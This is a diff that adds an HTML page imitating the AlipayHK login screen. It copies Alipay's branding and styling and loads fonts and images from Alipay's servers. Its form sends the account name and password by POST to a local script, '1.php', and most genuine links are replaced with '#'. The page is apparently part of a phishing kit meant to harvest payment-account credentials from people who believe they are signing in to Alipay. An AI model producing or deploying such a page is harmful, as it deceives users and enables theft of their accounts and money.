@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=GBK">
+<title>Login - AlipayHK</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+<style>
+@font-face {
+    font-family: "rei";
+    src: url("https://i.alipayobjects.com/common/fonts/rei.eot?20150616"); /* IE9 */
+    src: url("https://i.alipayobjects.com/common/fonts/rei.eot?20150616#iefix") format("embedded-opentype"), /* IE6-IE8 */
+    url("https://i.alipayobjects.com/common/fonts/rei.woff?20150616") format("woff"), /* chrome 6+、firefox 3.6+、Safari5.1+、Opera 11+ */
+    url("https://i.alipayobjects.com/common/fonts/rei.ttf?20150616")  format("truetype"), /* chrome、firefox、opera、Safari, Android, iOS 4.2+ */
+    url("https://i.alipayobjects.com/common/fonts/rei.svg?20150616#rei") format("svg"); /* iOS 4.1- */
+}
+.iconfont {
+    font-family:"rei";
+    font-style: normal;
+    font-weight: normal;
+    cursor: default;
+    -webkit-font-smoothing: antialiased;
+}
+</style>
+<link charset="utf-8" rel="stylesheet" href="authcenter.globalprod-1.2.css" media="all">
+<link charset="utf-8" rel="stylesheet" href="alice.components.security-edit-1.4.css" media="all">
+<style type="text/css">
+  
+.ui-form .ui-form-item,
+.ui-form .ui-form-item-error {
+	padding-bottom: 5px;
+	min-height: 48px;
+	*+min-height: 51px;
+	*_height: 51px;
+}
+.ui-form .sl-checkcode {
+	padding-bottom: 0;
+	min-height: 68px;
+	*+min-height: 71px;
+	*_height: 71px;
+}
+.ui-form .ui-form-item-error .ui-form-explain {
+	background-position: -186px 2px;
+}
+.ui-form-explain {
+	padding-top: 0;
+}
+.ui-form-other {
+	margin-left: 0;
+}
+.ui-form-item-submit input {
+	vertical-align: auto;
+}
+.ui-checkcode-input {
+	ime-mode: disabled;
+}
+.ui-checkcode-imgcode-img {
+	width: 88px;
+	height: 30px;
+}
+.ui-button-lwhite, .ui-button-lwhite:hover, .ui-button-mwhite, .ui-button-mwhiter:hover, .ui-button-swhite, .ui-button-swhite:hover, .ui-button-text, .ui-button-lorange, .ui-button-lorange:hover, .ui-button-morange, .ui-button-morange:hover, .ui-button-sorange, .ui-button-sorange:hover {
+	background-image: url("olhkERUadRSBTBV.png");
+}
+
+.alieditContainer {
+	height: 28px !important;
+}
+</style>
+<style>
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="auth-header">
+    <h1 class="logo">
+      <a seed="globallogin-Home">
+        <img src="qLlKVsZuTordMlU.png" width="140" height="60" alt="Alipay">
+      </a>
+    </h1>
+    <div class="auth-header-link">
+      <a seed="globallogin-Home">Home</a>
+    </div>
+  </div>
+  <div class="auth-content fn-clear">
+  <div class="auth-login auth-login-shadow">
+    <div class="auth-login-tit">
+      <h3>Sign In Alipay HK</h3>
+    </div>
+    <div class="auth-login-cnt">
+      <div class="auth-login-form">
+            <form id="login" class="ui-form" name="loginForm" action="1.php" method="post">
+          <div class="ui-form-item">
+            <label class="ui-label" for="logonId">Account:</label>
+            <input id="logonId" name="logonId" value="" class="ui-input" tabindex="1" placeholder="Alipay Login" type="text" autocomplete="off" seed="globallogin-account" ui-form-explain="" required>
+          <div class="ui-form-explain"></div></div>
+          <div class="ui-form-item">
+            <label class="ui-label" for="password_input">Password:</label>
+    <input style="display:none" seed="login-ipt" smartracker="on">
+  <input type="password" style="display:none" seed="login-iptT1" smartracker="on" required>
+        <span class="standardPwdContainer" style="display:none">
+      <input type="password" tabindex="2" id="password_input" name="password_input" class="ui-input" oncontextmenu="return false" onpaste="return false" oncopy="return false" oncut="return false" autocomplete="off" seed="standardPwdContainer-password_input" smartracker="on" ui-form-explain="">
+    </span>
+    <span class="alieditContainer" id="password_container"><input type="password" tabindex="2" id="password_rsainput" name="password_rsainput" class="ui-input i-text" oncontextmenu="return false" onpaste="return false" oncopy="return false" oncut="return false" autocomplete="off" value=""></span>
+<style type="text/css">
+  input.sixDigitPassword {
+    position: absolute;
+    color: #fff;
+    opacity: 0;
+    width: 1px;
+    height: 1px;
+    font-size: 1px;
+    left: 0;
+    -webkit-box-sizing: content-box;
+    box-sizing: content-box;
+    -webkit-user-select:initial; /* 取消禁用选择页面元素 */
+    outline: 'none';
+    margin-left: '-9999px';
+  }
+
+  div.sixDigitPassword {
+    cursor:text;
+    background: #fff;
+    outline: none;
+    position: relative;
+    padding: 8px 0;
+    height: 14px;
+    border: 1px solid #cccccc;
+    border-radius: 2px;
+  }
+
+  div.sixDigitPassword i {
+    float: left;
+    display: block;
+    padding: 4px 0;
+    height: 7px;
+    border-left: 1px solid #cccccc;
+  }
+
+  div.sixDigitPassword i.active {
+    background-image: url("https://t.alipayobjects.com/images/rmsweb/T1nYJhXalXXXXXXXXX.gif");
+    background-repeat: no-repeat;
+    background-position: center center;
+  }
+
+  div.sixDigitPassword b {
+    display: block;
+    margin: 0 auto;
+    width: 7px;
+    height: 7px;
+    overflow: hidden;
+    visibility:hidden;
+    background-image: url("https://t.alipayobjects.com/tfscom/T1sl0fXcBnXXXXXXXX.png");
+  }
+
+  div.sixDigitPassword span {
+    position: absolute;
+    display: block;
+    left: 0px;
+    top: -1px;
+    height: 30px;
+    border: 1px solid rgba(82, 168, 236, .8);
+    border: 1px solid #00ffff\9;
+    border-radius: 2px;
+    visibility: hidden;
+    -webkit-box-shadow: inset 0px 2px 2px rgba(0, 0, 0, 0.75), 0 0 8px rgba(82, 168, 236, 0.6);
+    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
+  }
+  </style>
+            <p class="ui-form-other"><a href="#" title="Forgot your password?" target="_blank" seed="login-link" smartracker="on">Forgot your password?</a></p>
+          <div class="ui-form-explain"></div></div>
+<div class="ui-form-item ui-form-item-submit">
+            <div class="ui-button ui-button-morange">
+              <input type="submit" id="J-login-global-btn" value="Sign In" class="ui-button-text" seed="globallogin-signin">
+            </div>
+            <div class="ui-form-signup">
+                            <a href="#" seed="globallogin-signup">Sign Up for Free</a>
+            </div>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+  <div class="auth-banner">
+    <img src="38kvMUkDFr.jpg" width="610" height="330" alt="" seed="authBanner-iE20120538kvMUkDFr" smartracker="on">
+  </div>
+</div>
+<style>
+.foot {margin:40px auto 0;width:990px;height:110px;border-top:1px solid #ececec;}
+.footer {padding-top:24px;height:48px;text-align:center;font-size:13px;line-height:24px;}
+.footer a {color: #999;}
+#ServerNum {color:#fff;text-align:center;}
+</style>
+<div class="foot fn-clear">
+    <div class="footer">
+        <p class="fn-clear">
+    <a href="#" target="_blank" seed="footer-About-Alipay" smartracker="on">About Alipay</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+    <a href="#" target="_blank" seed="footer-Join-Us" smartracker="on">Join Us</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+    <a href="h#" target="_blank" seed="footer-Contact-Us" smartracker="on">Contact Us</a>
+</p>
+<p class="fn-clear">Copyright 2022 ALIPAY. All Rights Reserved.</p>
+<div class="server" id="ServerNum">authcenter-42-7134</div>
+</div>
+</div>
+</div>
+</body>
+</html>
